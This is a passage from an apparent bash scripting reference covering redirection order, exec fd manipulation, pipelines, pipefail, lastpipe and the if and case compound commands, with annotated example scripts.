systems without `/dev/fd`, bash falls back to FIFOs in `/tmp`, which
may interact poorly with restrictive `noexec`/`nodev` mount options.
Within the BCS-targeted Linux environment, `/dev/fd/N` is always
available. For containerised environments, verify `/dev/fd` is mounted
in the runtime image — the symptom of its absence is a parse-time
"redirection error: cannot create temp file" diagnostic.

**See also**: §5.7 (process substitution as expansion), §6.13
(pipelines), §6.16 (`lastpipe`), §13.5 (`pipefail` and PIPESTATUS),
§9.3 (BCS0903 process substitution patterns), §9.6 (BCS0906 find
subshell pitfalls).

## 6.11 Order of evaluation

Bash applies redirections strictly *left-to-right* against the current
fd table, before the command is executed. Each operator either opens a
new file description (the `>file` and `<file` family) or duplicates an
existing description (`>&n`, `<&n`) — and the duplication captures
whatever the source fd points at *at that moment*, not at the end of
the redirection list. This rule is what makes `>file 2>&1` and
`2>&1 >file` produce different results.

### The rule

For each redirection, in left-to-right order:

1. Evaluate the right-hand operand (filename or fd number).
2. Apply the corresponding `dup2()` / `open()` / `close()` syscall to
   the named left-hand fd.
3. Move on to the next redirection with the fd table now updated.

The command is then exec'd with the resulting fd table inherited.

### The notorious `>file 2>&1` versus `2>&1 >file`

Both forms use exactly the same two operators. The difference is
sequence; the difference in result is total:

```bash
# scenario: trace both forms operator-by-operator against the fd table
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

# Form A — correct
{ echo to-stdout; echo to-stderr >&2; } >out.log 2>&1
#                                      ^^^^^^^^ step 1: open out.log on fd 1
#                                                        fd 1 → out.log
#                                                        fd 2 → terminal (unchanged)
#                                               ^^^^^^^ step 2: dup fd 1 onto fd 2
#                                                        fd 1 → out.log
#                                                        fd 2 → out.log
# → both messages land in out.log

# Form B — wrong (stderr stays on terminal)
{ echo to-stdout; echo to-stderr >&2; } 2>&1 >out2.log
#                                       ^^^^ step 1: dup fd 1 onto fd 2
#                                                        fd 1 → terminal
#                                                        fd 2 → terminal (was already, copy)
#                                            ^^^^^^^^ step 2: open out2.log on fd 1
#                                                        fd 1 → out2.log
#                                                        fd 2 → terminal (still!)
# → stdout lands in out2.log; stderr stays on the terminal
```

The mnemonic: **target before merge**. The redirect that names a file
must come before the merge that says "stderr follows stdout". Reversed,
the merge captures stale state.

### Multiple writes to the same file

Two separate `> file` operators *open the file twice*, producing two
independent fds with two independent offsets. Both write to the same
file but the kernel does not synchronise them — output may interleave
in unpredictable ways, and one fd's writes can land in bytes another
expected to occupy:

```bash
# scenario: 1>log 2>log races; 1>log 2>&1 does not
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

# WRONG — two opens, two offsets, racing writers
seq 1 5 1>race.log 2>race.log >&2 &
seq 6 10 >>race.log &
wait
# → race.log content is non-deterministic (bytes from both writers interleave)

# RIGHT — one open, two fds sharing the same description and offset
seq 1 5 >shared.log 2>&1 &
seq 6 10 >>shared.log &
wait
# → shared.log content is deterministic (each writer's lines appear intact)
```

The `&>` shorthand and `>file 2>&1` form both produce the
single-shared-description case; `1>file 2>file` produces the racing
case. This is one of the strongest reasons to prefer the shorthand or
the explicit-merge form.

### Inside `exec`

`exec` follows the same left-to-right rule, applying every redirection
to the *shell's own* fd table:

```bash
exec 3>&1 1>log 2>&1
# step 1: dup fd 1 (terminal) onto fd 3   → fd 3 = terminal
# step 2: open log on fd 1                → fd 1 = log
# step 3: dup fd 1 (now log) onto fd 2    → fd 2 = log
# fd 3 holds the saved terminal stdout for later restoration
```

The save-then-redirect-then-merge pattern in a single `exec` is correct
*only* because of the left-to-right rule.

### Practical guidance

- Always specify the file target first, the merge second.
- Prefer `&>` (or `&>>`) when both streams want the same file — bash
  parses it as one operation, sidestepping the ordering trap entirely.
- When in doubt, mentally trace the operators against a two-row table
  (fd 1 / fd 2) and apply each in order; do not assume a "merge"
  metaphor that does not match the syscall semantics.

**See also**: §6.4 (stderr redirection and merging), §6.6 (duplicating
fds), §6.12 (`exec` for fd manipulation), §1.2 (the fd table model),
BCS0711.

## 6.12 `exec` for fd manipulation

`exec` has two distinct modes that share a name only by accident of
history. With a command argument, it *replaces the shell process* with
that command — the calling shell ceases to exist. Without a command,
it *applies its redirections to the current shell* and continues
executing the script. The latter is the only way to make redirections
persist beyond a single command, and the only way to manage long-lived
fds from inside a script.

### The two modes

- `exec cmd …` — `execve()`-replace this shell with *cmd*. The script
  ends here; whatever was after this line is dead code.
- `exec REDIR…` — apply *REDIR…* to the calling shell's fd table.
  Script continues; subsequent commands inherit the new fd state.

These two modes share the *redirection grammar*: `exec cmd >log` execs
*cmd* with stdout pointed at *log*, while `exec >log` redirects the
*current shell*'s stdout to *log* and returns. The presence or absence
of a command argument is the deciding factor.

### Persistent script-wide redirection

The most common script-wide use of `exec` is to redirect everything to
a log:

```bash
# scenario: redirect all subsequent output of this script to a logfile
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -- LOGFILE='/var/log/myscript.log'

# Save originals on fd 3 (stdout) and fd 4 (stderr) for later restore
exec 3>&1 4>&2

# Redirect script-wide
exec >>"$LOGFILE" 2>&1

echo "this line is logged"
date
echo "diagnostic" >&2

# Restore (move-form clears the saved fds atomically)
exec 1>&3- 2>&4-
echo "this line is back on terminal stdout"
echo "this too on terminal stderr" >&2
```

The save-redirect-restore pattern is the standard technique; using the
move-form (`1>&3-`, `2>&4-`) for the restore atomically closes the
saved fds, preventing leaks into any later children (§6.7).

### Custom fd for read+write — fd 7 idiom

`exec` is also how scripts open custom fds for repeated `read`/`printf`
without re-opening the file each time. Convention puts user fds in the
3–9 range; bash itself may use fds beyond that internally:

```bash
# scenario: open a config file once, read multiple lines, write a marker, close
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -- conf='session.dat'
[[ -f $conf ]] || : >"$conf"     # ensure exists

exec 7<>"$conf"                  # fd 7 open for read+write (§6.5)

# Read existing lines (offset advances as we read)
declare -a lines=()
while read -r -u 7 line; do
  lines+=("$line")
done

# Append a new marker (offset is at EOF after the reads)
printf 'session-end %(%FT%T%z)T\n' -1 >&7

exec 7>&-                        # close fd 7
echo "read ${#lines[@]} prior lines"
```

`read -u 7` reads from fd 7; `printf … >&7` writes to it; `exec 7>&-`
closes it. The fd persists across all three commands — replacing it
with a series of `<file` / `>file` operators on each command would
force re-opens and lose the offset.

### `exec`-replace mode (the other meaning)

When `exec` carries a command, the shell calls `execve()` and the
script's process *becomes* that command. The script ends; nothing after
the `exec` line runs:

```bash
# scenario: tail-call into a longer-running program
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

# Set up environment, then hand off to the real binary
declare -x PATH='/usr/local/bin:/usr/bin:/bin'
exec /usr/sbin/myservice "$@"

# DEAD CODE — never reached unless `exec` itself fails (e.g. missing binary)
echo "this line will never print"
```

The replace-mode is useful for wrapper scripts (set environment, then
become the wrapped program) and for trampolines that should not leave a
parent shell hanging around. Note the scripted error: `exec /missing`
*does* fail and continue executing the script if the binary is missing
— protect with `||` or rely on `set -e` to catch the failure.

### `varredir_close` — Bash 5.2 fd lifetime tied to variable scope

Bash 5.2 introduced `shopt -s varredir_close` to address a long-standing
fd-leak hazard: when an fd is opened by a `{var}> file` redirection
(the variable-fd form), the fd outlives the command unless explicitly
closed. With `varredir_close` enabled, bash automatically closes such
fds when the variable goes out of scope:

```bash
# Without varredir_close: fd assigned to $log_fd leaks if not closed
exec {log_fd}>log
# … fd remains open until script exit or explicit `exec {log_fd}>&-`

# With varredir_close: fd closes when log_fd is unset or function returns
shopt -s varredir_close
log_step() {
  local -i log_fd
  exec {log_fd}>log         # log_fd is local; fd closes on function return
  printf 'step done\n' >&"$log_fd"
}
log_step                    # fd auto-closed here, no leak
```

This is BCS-recommended for new code; combine with `local -i` for any
function that opens a fd via the `{var}>` form.

**See also**: §6.6 (duplicating fds), §6.7 (move and close), §11.x
(`exec`-replace and process replacement), §13.x (errexit interaction
with exec), BCS0101 (strict mode), BCS0107 (function organisation),
BCS0703 (messaging).

## 6.13 Pipelines

`a | b` connects `a`'s stdout to `b`'s stdin via a kernel pipe — a
fixed-capacity in-memory FIFO managed by `pipe()`. Each component runs
in its own process (typically a subshell, see §6.16 for the
`lastpipe` exception); they execute in parallel, with the kernel
synchronising on the pipe buffer's fill state. Bash adds no buffering
of its own — line-buffering vs block-buffering is the responsibility
of each component (most stdio-using programmes block-buffer when their
stdout is a pipe rather than a terminal).

### Forms

- `a | b` — single pipe; `a`'s fd 1 connects to `b`'s fd 0.
- `a |& b` — pipe stdout *and* stderr (§6.14); shorthand for
  `a 2>&1 | b`.
- `a | b | c | d` — multi-stage; three pipes, four processes, all
  running concurrently.
- `time a | b | c` — time the *whole* pipeline as one logical unit.
- `! a | b | c` — negate; pipeline status is logically inverted.

### Pipe semantics

- All components fork before any executes; they run in parallel.
- Each pipe has a kernel-side buffer (typically 64 KiB on Linux);
  writers block on full, readers block on empty.
- When the reader closes its fd, the writer receives SIGPIPE on the
  next write — default disposition is termination with exit status 141
  (= 128 + signal 13).
- The pipeline waits for the *rightmost* component (and, in modern
  bash, all components) before returning.

### Default exit status

Without `pipefail`, only the rightmost component's exit status becomes
`$?`. This is the standard pitfall: `producer | consumer` exits 0 if
*consumer* succeeds, even when *producer* failed catastrophically.
`pipefail` (§6.15) corrects this. The full status vector is always
available in `PIPESTATUS[]`:

```bash
# scenario: the PIPESTATUS array exposes every component's exit status
#!/usr/bin/env bash
set -uo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

# four-component pipeline with mixed success
true | (exit 3) | true | (exit 7)
echo "rc=$? PIPESTATUS=${PIPESTATUS[*]}"
# ⇒ rc=7 PIPESTATUS=0 3 0 7

# without pipefail the same pipeline returns just the last
set +o pipefail
true | (exit 3) | true | true
echo "rc=$? PIPESTATUS=${PIPESTATUS[*]}"
# ⇒ rc=0 PIPESTATUS=0 3 0 0   — failure of mid-component invisible in $?

# but PIPESTATUS preserves it
echo "second component status was: ${PIPESTATUS[1]}"
# ⇒ second component status was: 3
```

`PIPESTATUS[]` is overwritten by the *next* command — even a trivial
`[[ ]]` test reduces it to a one-element array holding `$?`. Snapshot
it immediately after the pipeline:

```bash
# scenario: capture PIPESTATUS before the next command clobbers it
set -uo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

curl -sf https://example.org/data.json | jq -e '.records[]' | head -50
declare -ai rcs=("${PIPESTATUS[@]}")    # snapshot now or lose it

if (( rcs[0] != 0 )); then
  echo "curl failed: rc=${rcs[0]}" >&2; exit 5
elif (( rcs[1] != 0 )); then
  echo "jq failed: rc=${rcs[1]}" >&2; exit 5
elif (( rcs[2] != 0 )); then
  # head closing early triggers SIGPIPE on jq → 141 expected and benign
  (( rcs[2] == 141 )) || { echo "head failed: rc=${rcs[2]}" >&2; exit 5; }
fi
```

### Subshell consequences

By default *every* component of a pipeline runs in a subshell — even
the rightmost — which means variables assigned inside a component are
not visible after the pipeline:

```bash
# WRONG — count stays 0
declare -i count=0
seq 1 5 | while read -r _; do count+=1; done
echo "count=$count"             # ⇒ count=0  (the while ran in a subshell)

# RIGHT — process substitution keeps the loop in the parent shell
declare -i count=0
while read -r _; do count+=1; done < <(seq 1 5)
echo "count=$count"             # ⇒ count=5

# RIGHT — lastpipe (§6.16) makes the LAST component run in the parent
shopt -s lastpipe
set +m                          # required when interactive
declare -i count=0
seq 1 5 | while read -r _; do count+=1; done
echo "count=$count"             # ⇒ count=5
```

Process substitution (§6.10) is the BCS-recommended fix; `lastpipe` is
the lighter-touch alternative when only the rightmost component needs
parent-shell scope.

### `time` and negation

`time a | b | c` times the whole pipeline as a single unit; the `time`
keyword binds at pipeline level. `! a | b | c` inverts the pipeline's
exit status (zero ↔ non-zero); useful for `if !` patterns guarding
against unexpected success.

**See also**: §6.14 (stderr pipelines `|&`), §6.15 (`pipefail`
semantics), §6.16 (`lastpipe`), §13.5 (`pipefail` + errexit), §9.3
(BCS0903 process substitution), §9.6 (BCS0906 find subshell pitfalls),
BCS0101 strict-mode trio.

## 6.14 Stderr pipelines (`|&`)

`a |& b` is the parser shorthand for `a 2>&1 | b` — both stdout and
stderr of `a` flow into `b`'s stdin. Bash 4.0+. Useful when a noisy
producer mixes diagnostics with data and the consumer needs to see
both streams.

### Equivalence with `2>&1 |`

```bash
# scenario: |& and 2>&1 | produce identical pipelines
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

producer() {
  echo 'data line'
  echo 'diagnostic line' >&2
}

# Form A — combined operator
producer |& cat -n
# ⇒ data line
# ⇒ diagnostic line

# Form B — manual stderr merge, identical result
producer 2>&1 | cat -n
# ⇒ data line
# ⇒ diagnostic line
# (cat -n prefixes each line with `<spaces>N<TAB>`; both forms feed it
#  the same merged stream, so the numbered output is identical)
```

The two forms compile to the same fd-table operations: open the pipe,
dup the write end onto fd 1, then dup fd 1 onto fd 2 — in that order.
The ordering bug that plagues hand-written `2>&1 >file` (§6.4) cannot
occur with `|&` because the operator name picks a single fixed
ordering.

### Exit status and `pipefail`

`|&` is a pipeline operator like `|`; the exit-status rules of §6.13
and §6.15 apply unchanged. With `set -o pipefail` (mandatory under
BCS strict mode, BCS0101), the pipeline exits non-zero if **any**
component does.

### When to use it

- Capturing the merged output of a noisy command into a single
  pager / logger / filter: `make build |& tee build.log`.
- Filtering both data and diagnostics through the same `grep`/`sed`:
  `wget -q --content-on-error … |& grep -v '^Saving to'`.
- Anywhere `2>&1 |` was the intent — `|&` is shorter and harder to
  reorder by accident.

### When **not** to use it

- When stdout is data and stderr is diagnostics, and the consumer is
  a *data* sink (counter, parser, DB loader). Mixing the streams
  corrupts the data path. Use `2> err.log | parser` instead, sending
  stderr to a file the parser ignores.
- When you need pipeline-component status detection by stream: with
  `|&` both streams collapse into one, so the consumer cannot tell
  data from diagnostics.

### BCS posture

- `|&` is fine in BCS scripts when "I want both streams" is the
  literal intent (BCS0711 family — combined redirection).
- For "send everything to a file (not a pipe)", prefer `&> file`
  (§6.3, §6.4); `|&` is for pipelines, `&>` is for files.
- Always `set -o pipefail` so a producer failure surfaces (BCS0101).

**See also**: §6.4 (stderr merging — the order-of-operators rule),
§6.13 (pipeline mechanics and `PIPESTATUS`), §6.15 (`pipefail`),
§6.16 (`lastpipe`).

## 6.15 `pipefail` semantics

`set -o pipefail` redefines a pipeline's exit status from "the
rightmost component's status" to "the rightmost *non-zero* component's
status, or zero if every component succeeded". Without it, error
detection through pipes is silently broken: `false | true` returns 0
and any subsequent `set -e` check passes blithely. With it, the same
pipeline returns 1 and `errexit` fires. `pipefail` is one third of the
strict-mode trio — `set -e -o pipefail` plus `shopt -s inherit_errexit`
— mandated for every BCS-compliant script (BCS0101).

### The rightmost-non-zero rule

A pipeline of `N` components produces `N` exit statuses, one per
component, available in `${PIPESTATUS[0]}` through
`${PIPESTATUS[N-1]}`. The pipeline's overall status is then:

- Without `pipefail`: `${PIPESTATUS[N-1]}` — only the last component.
- With `pipefail`: 0 if all are 0; otherwise `${PIPESTATUS[k]}` where
  *k* is the *highest* index whose status is non-zero — that is, the
  *rightmost* failure.

"Rightmost non-zero" is the rule literally; it is *not* "first
failure". `false | (exit 3) | (exit 7)` returns 7, not 1.

### The strict-mode trio in action

`pipefail` alone changes only the pipeline's status; it does not
trigger an exit. `errexit` then sees the new status and applies the
exemption matrix as it would for any other command. `inherit_errexit`
ensures the rule survives into command substitutions and explicit
subshells:

```bash
# scenario: the trio in action — trace pipeline status under each combination
#!/usr/bin/env bash
# (no `set -e` yet — we want to read each result)
set -uo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

# All-success
true | true | true
echo "all-ok        rc=$? PIPESTATUS=${PIPESTATUS[*]}"
# ⇒ all-ok        rc=0 PIPESTATUS=0 0 0

# Middle fails — pipefail surfaces it
true | false | true
echo "mid-fail     rc=$? PIPESTATUS=${PIPESTATUS[*]}"
# ⇒ mid-fail     rc=1 PIPESTATUS=0 1 0

# Without pipefail — same pipeline appears successful
set +o pipefail
true | false | true
echo "no-pipefail  rc=$? PIPESTATUS=${PIPESTATUS[*]}"
# ⇒ no-pipefail  rc=0 PIPESTATUS=0 1 0   — failure invisible in $?

# Multiple failures — pipefail picks the rightmost
set -o pipefail
false | (exit 3) | (exit 7)
echo "many-fail    rc=$? PIPESTATUS=${PIPESTATUS[*]}"
# ⇒ many-fail    rc=7 PIPESTATUS=1 3 7
```

Once `set -e` is also active, every non-zero pipeline result aborts the
script — exactly the behaviour BCS demands.

### Interaction with `set -e`

`pipefail` *does not* by itself exit on failure. It re-defines the
pipeline's exit status; `errexit` then decides whether to abort, using
the standard exemption matrix:

| Form | Without pipefail | With pipefail (under set -e) |
|------|------------------|-------------------------------|
| `a \| b` (b succeeds) | exits 0 | exits 0 if a also succeeds, else aborts |
| `a \| b` (a fails) | exits 0 (silent loss) | aborts on a's failure |
| `a \| b \|\| handler` | handler runs only if b fails | handler runs on any failure |
| `if a \| b; then …` | tested on b's status | tested on rightmost-non-zero |

The most useful pattern is the ` \|\| handler` tail: a failed pipeline
followed by `\|\| handler` masks the failure cleanly without disabling
`pipefail` globally:

```bash
# scenario: handle expected SIGPIPE-style failures locally without disabling pipefail
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

# `head` quitting after the first match causes upstream SIGPIPE → 141.
# Tolerate it for THIS pipeline only.
{ producer | filter | head -1; } || (( $? == 141 )) || die 5 "pipeline failed"
# ⇒ rc=141 accepted; any other non-zero status aborts via die

# Alternative: capture and inspect PIPESTATUS for finer control
producer | filter | head -1 || true
declare -ai rcs=("${PIPESTATUS[@]}")
(( rcs[0] == 0 || rcs[0] == 141 )) || die 5 "producer failed"
(( rcs[1] == 0 || rcs[1] == 141 )) || die 5 "filter failed"
```

The `|| (( $? == 141 ))` idiom is the standard escape hatch when a
pipeline's tail (`head`, `grep -q`, `awk 'NR==1{exit}'`) is *expected*
to terminate early.

### Pipelines vs lists

`a; b; c` is a *list*, not a pipeline; `pipefail` does not apply.
Errexit visits each command in turn. Likewise `a && b && c` is not a
pipeline — each command is separate, each subject to errexit on its own
status. `pipefail` only governs the `|`-connected case.

### Practical guidance

Always pair `pipefail` with `errexit` and `inherit_errexit` (BCS0101).
Without `pipefail`, error detection through pipes is silently broken,
and bugs migrate from the producing side to whichever component happens
to read last. With it, every component is a first-class participant in
error handling.

When SIGPIPE is expected (rc 141), plan for it explicitly — do not
silently `|| true` a pipeline, because that mask hides every other
failure too.

**See also**: §6.13 (pipelines), §6.16 (`lastpipe`), §13.2 (errexit
semantics), §13.3 (errexit exemption matrix), §13.5 (`set -o pipefail`
deep dive), §13.9 (strict-mode contract), BCS0101, BCS0601.

## 6.16 `lastpipe` semantics

`shopt -s lastpipe` runs the *last* command of a pipeline in the
current shell rather than a subshell, so variables it assigns remain
visible after the pipeline ends. It cures the long-standing
`cmd | while read … done` outer-scope problem without rewriting to a
process-substitution form. The catch is that it is effective only when
job control is off — non-interactive shells get it for free, but
interactive shells must `set +m` first.

### The default-subshell problem

By default every component of a pipeline runs in its own subshell,
including the last. Variable assignments inside the last component
mutate the subshell's environment and disappear when it exits:

```bash
# scenario: default behaviour — the while loop's count is lost
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -i count=0

# WRONG — without lastpipe the while runs in a subshell
seq 1 5 | while read -r _; do
  count+=1
done
echo "without lastpipe: count=$count"
# ⇒ without lastpipe: count=0   — assignments inside while were discarded
```

The fix has historically been process substitution (§6.10):

```bash
# scenario: process substitution keeps the consumer in the parent shell
declare -i count=0
while read -r _; do
  count+=1
done < <(seq 1 5)
echo "with proc-sub:    count=$count"
# ⇒ with proc-sub:    count=5
```

`lastpipe` offers a less-invasive alternative — keep the pipeline form
but enable parent-shell execution for the rightmost component.

### Enabling `lastpipe`

`lastpipe` requires Bash 4.2+ and is effective only when monitor mode
(job control) is off:

```bash
# scenario: lastpipe on, with the job-control caveat made explicit
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob
shopt -s lastpipe

# Job control is off by default in non-interactive scripts, so the
# `set +m` line is documentation-only here. In interactive shells it is
# REQUIRED before lastpipe takes effect.
set +m

declare -i count=0
seq 1 5 | while read -r _; do
  count+=1
done
echo "with lastpipe:    count=$count"
# ⇒ with lastpipe:    count=5
```

In an interactive shell *without* `set +m`, the same pipeline reverts
to subshell semantics silently — `count` stays 0 and there is no
warning. The `set +m` qualifier is therefore load-bearing for any
example a reader might paste into an interactive REPL.

### What `lastpipe` does and does not change

- ✓ Last component runs in the parent; assignments persist.
- ✓ `PIPESTATUS[]` still holds every component's status.
- ✓ `pipefail` still applies; the strict-mode trio is unaffected.
- ✗ The first *N-1* components still run in subshells. Only the tail
  is special.
- ✗ `set -e` exemption rules are unchanged — a `cmd | while …` whose
  body has a non-zero command will exit if errexit is enabled and the
  body is not in an exempt context (§13.3).

### Pitfalls

- **Interactive paste-test silently fails.** The example above is
  correct in a script but appears broken when pasted into an
  interactive shell unless the reader has previously run `set +m`. Mark
  any `lastpipe` demonstration as a script, not a REPL fragment.
- **Errexit interaction.** `lastpipe` does not give the consumer body
  any new exemption — if the body runs `[[ -n $x ]]` and `$x` is empty,
  errexit fires inside the loop and aborts the script.
- **Composition with `read`.** The classic `while read -r` consumer is
  the canonical use case; combine with `IFS=` and `-r` per BCS0905 to
  preserve whitespace and backslashes.
- **Not a substitute for process substitution in all cases.** When the
  consumer must read from *more than one* producer, only process
  substitution composes; `lastpipe` is single-tail-only.

### Practical guidance

For new scripts, prefer `< <(producer)` process substitution — it
composes, it works in interactive shells without ceremony, and it makes
the parent-shell scope visually obvious. Reach for `lastpipe` when
modifying existing code that uses `producer | while read` form and
process-substitution refactoring is not warranted.

**See also**: §6.10 (process substitution as redirection), §6.13
(pipelines and subshell semantics), §6.15 (`pipefail`), §13.3 (errexit
exemption matrix), §9.5 (BCS0905 input redirection patterns), §9.6
(BCS0906 find subshell pitfalls), BCS0101.

# Part VII — Control Flow and Compound Commands

*The compositional layer of bash: how to assemble simple commands into conditional, iterative, and grouped structures. This Part documents every compound command form.*

---

---

## 7.1 Compound command overview

A *compound command* is a single syntactic unit assembled from one or
more lower-level commands; bash defines exactly **ten** forms. Each
form has its own keywords, body, and exit-status rule, but all ten
share the property that the entire construct can be redirected,
piped, backgrounded, or used as the body of a function as if it were
a single simple command.

The ten forms are:

1. brace group — `{ list; }` (current shell, §7.9)
2. subshell — `( list )` (forked child, §7.8)
3. `if … then … [elif …] [else …] fi` (§7.2)
4. `case … in … esac` (§7.3)
5. `while list; do …; done` (§7.6)
6. `until list; do …; done` (§7.6)
7. `for name in words; do …; done` (§7.4)
8. `for (( init; cond; update )); do …; done` (§7.5)
9. `select name in words; do …; done` (§7.7)
10. arithmetic command `(( expr ))` (§7.5, §8.9)

Plus the *test* compound `[[ expr ]]` which is a reserved-word
construct rather than a compound command in the grammar's strict
sense, but which behaves like one and is grouped here for ease of
reference (§8.1).

### Properties shared by every form

```bash
# scenario: compound commands accept redirections, can be piped,
#           can be backgrounded, and can be a function body.
{ echo first; echo second; } > out.txt          # redirect the whole group (BCS0301)
for f in *.log; do gzip "$f"; done | wc -l      # pipe a for-loop's stdout
( cd /tmp && tar cf - . ) | ssh ok1 'cat > /backup/tmp.tar' &  # backgrounded subshell
process_dir() { for f in "$1"/*; do printf '%s\n' "$f"; done; }
```

Every compound command also carries an exit status:

- brace group, subshell, `if`/`else`, `for`, `while`, `until`,
  `select` → status of the **last** simple command executed
  inside the body (or 0 if the body was empty).
- `case` → status of the matched branch's last command, or 0 if no
  pattern matched.
- `(( expr ))` → 0 if `expr` is non-zero, 1 if `expr` is zero.
- `[[ expr ]]` → 0 if `expr` is true, 1 if false (2 on syntax error).

### Backreference: error-handling implications

The exit-status rule above interacts directly with `set -e`. A
compound command that ends in a deliberately failing test (e.g. a
`while` loop whose condition becomes false) yields a non-zero status
when used as a stand-alone statement, which under strict mode kills
the script. The standard fix is to terminate with `:`:

```bash
# scenario: prevent a while-read loop from tripping set -e
while read -r line; do
  printf '%s\n' "$line"
done < input.txt
:                                              # ⇒ status 0; loop exit value discarded (BCS0601)
```

**See also**: §7.2 `if`, §7.3 `case`, §7.4 `for x in list`, §7.5
C-style `for` and `(( ))`, §7.6 `while`/`until`, §7.7 `select`, §7.8
subshell grouping, §7.9 brace grouping, §7.10 `&&`/`||`
short-circuits, §7.11 `break`/`continue`, §7.13 `exit`, §8.1 `[[ ]]`
overview, §13.3 `errexit` exemption matrix, BCS0101 (strict mode),
BCS0501 (conditionals), BCS0503 (loops).

## 7.2 `if`/`elif`/`else`/`fi`

The conditional. The bash `if` is not a boolean test — it is a dispatcher
on *exit status*. Any command can serve as the condition; the branch
runs when that command's status is `0`. This is the single most
important fact about bash conditionals and the source of the
`if [[ … ]]` idiom: `[[ ]]` is just a builtin that exits `0` or `1`.

### Syntax

```
if list; then list; [elif list; then list;] … [else list;] fi
```

The condition is the exit status of the *last command* in the `if`
list, not the conjoined status of the whole list. This matters when the
`if`-list is itself an AND-OR chain (§7.10).

- `if [[ … ]]; then …; fi` — conditional-expression idiom.
- `if cmd; then …; fi` — exit-status idiom; equally valid.
- `if ! cmd; then …; fi` — negate the test.
- `if cond; then act; fi` — one-line form.
- An empty branch body must contain at least `:` (the null command);
  bash parses `if cond; then; fi` as a syntax error.

### Canonical forms

```bash
# scenario: dispatch on conditional expression
if [[ -f $config ]]; then
  source -- "$config"                # ⇒ runs when file exists
elif [[ -f $fallback ]]; then
  source -- "$fallback"
else
  warn 'no config found'
fi
```

```bash
# scenario: dispatch on command exit status (no [[ ]] needed)
if grep -q 'pattern' "$file"; then
  info 'matched'                     # ⇒ runs when grep exits 0
else
  info 'no match'                    # ⇒ runs when grep exits 1
fi
```

The second form is preferred whenever the condition *is* a command;
wrapping a command in `[[ -n $(cmd) ]]` is a code smell (BCS0303,
BCS0501). The exit-status form is faster (no command substitution),
clearer, and supports `! cmd` for negation.

### Errexit interaction (the exemption)

A command in an `if` condition is exempt from `set -e`. This is the
most-asked question about errexit: "why doesn't my script die when the
condition fails?" — because if it did, `if grep -q …; then` would
abort the script every time the pattern was absent. The exemption
applies to the *whole condition list*, including pipelines and AND-OR
chains:

```bash
# scenario: errexit exempts the if-condition
set -euo pipefail
cmd_that_exits_1() { return 1; }     # placeholder for some predicate

if cmd_that_exits_1; then            # → rc=1 from the test is exempt from set -e
  echo 'success'
else
  echo 'failure'                     # ⇒ failure
fi
```

The exemption is positional, not lexical. Calling a function from an
`if` condition makes the *whole function* exempt from errexit for the
duration of the call — including its inner commands. This is the
mechanism behind the most subtle errexit footgun in bash: a helper
function that "works" until you call it standalone (§13.3, BCS0601).

### One-line forms

```bash
# scenario: short conditional on a single line
[[ $# -gt 0 ]] || die 22 'argument required'
[[ -d $dir ]] || mkdir -p -- "$dir"
```

`[[ … ]] || cmd` is an AND-OR list (§7.10), not an `if`, but it serves
the same purpose for single-action conditionals and reads more
fluently in line-noise contexts. Reach for `if`/`fi` once two or more
actions are needed in the branch — chaining with `&&` / `||` past
two clauses invites the famous misconception trap (§7.10).

**See also**: §7.3 (`case` for multi-branch dispatch), §7.10 (AND-OR
short-circuits), §8 (conditional expressions and arithmetic), §13.3
(errexit and the condition exemption), BCS0303, BCS0501.

## 7.3 `case`/`esac`

Pattern-based dispatch. Patterns are *globs*, not literals or regular
expressions. `case` is the right tool for any 3+ branch decision and
for option parsing; the `if/elif` cascade equivalent is harder to read
and slower (BCS0502, BCS0801).

### Syntax

```
case word in
  pattern1 [| pattern2 …]) list ;;
  pattern3) list ;;
  *) list ;;
esac
```

- Patterns are matched left-to-right; *first match wins*.
- `*)` as a final clause is the conventional default branch.
- Patterns are subject to glob expansion: `*`, `?`, `[…]`, plus the
  full extended-glob vocabulary if `extglob` is set.
- `nocasematch` shopt makes matches case-insensitive (a useful tool for
  `y|Y|yes|YES` reductions, BCS0502).

### Quoting on the pattern

Quoting is what distinguishes a pattern from a literal:

```bash
# scenario: matching a value literally vs as a pattern
case $x in
  $y)   echo 'matched: $y as a pattern' ;;        # ⇒ globs y's contents
  "$y") echo 'matched: $y as literal text' ;;     # ⇒ exact-string match
esac
```

This is rarely what users want for the pattern half of `case`; the
literal-quoted form is the standard for "match this exact value." The
discriminator (the `word` after `case`) does not need quoting in the
common case — `case` does not perform word splitting on it — but
quoting it never hurts.

### Branch terminators: `;;`, `;&`, `;;&`

Bash supports three branch terminators, two of them post-Bash-4.0
extensions to POSIX `case`:

| Terminator | Effect |
|------------|--------|
| `;;` | Exit `case` after this branch (the default). |
| `;&` | Fall through to the *next* branch unconditionally. The next branch's body runs without re-testing. |
| `;;&` | Fall through *and* re-evaluate: continue testing patterns from the next branch onward. |

The Bash-4.0 fall-through forms are useful but rare; most authors do
not encounter them and most code does not need them. Demonstrate:

```bash
# scenario: ;& runs the next body without re-matching
case $x in
  alpha) echo 'a' ;&                   # falls through unconditionally
  beta)  echo 'b' ;;
  gamma) echo 'g' ;;
esac
# x=alpha   ⇒ prints "a" then "b"
# x=beta    ⇒ prints "b"
# x=gamma   ⇒ prints "g"
```

```bash
# scenario: ;;& re-tests subsequent patterns
case $file in
  *.tar.gz) echo 'tarball' ;;&         # also try gzip pattern
  *.gz)     echo 'gzipped' ;;
esac
# file=foo.tar.gz   ⇒ prints "tarball" then "gzipped"
# file=foo.gz       ⇒ prints "gzipped"
```

Reach for `;;&` when categories overlap (a `*.tar.gz` is both a
tarball and a gzipped file). Reach for `;&` when one branch's logic is
genuinely a superset of the next; the more common refactor is to
extract a helper function and call it from each branch.

### Extended-glob patterns

